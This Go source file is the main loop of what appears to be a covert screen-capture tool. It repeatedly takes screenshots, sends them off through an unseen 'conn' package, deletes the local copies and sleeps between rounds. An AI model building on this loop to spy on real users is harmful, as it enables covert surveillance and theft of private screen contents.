package main

import (
	"fmt"
	"os"
	"screenshooter/conn"
	"strconv"
	"time"
)

func main() {
	fmt.Println("[*] Screenshoter started")

	for {

		files := conn.Take_screenshot()

		for _, file := range files {
			conn.Send_screenshot(file)
			os.Remove(file)
		}
		if len(os.Args) > 1 {
			temp, _ := strconv.ParseInt(os.Args[1], 10, 0)
			time.Sleep(time.Duration(temp) * time.Minute)

		} else {

			time.Sleep(40 * time.Second)
		}

	}
}
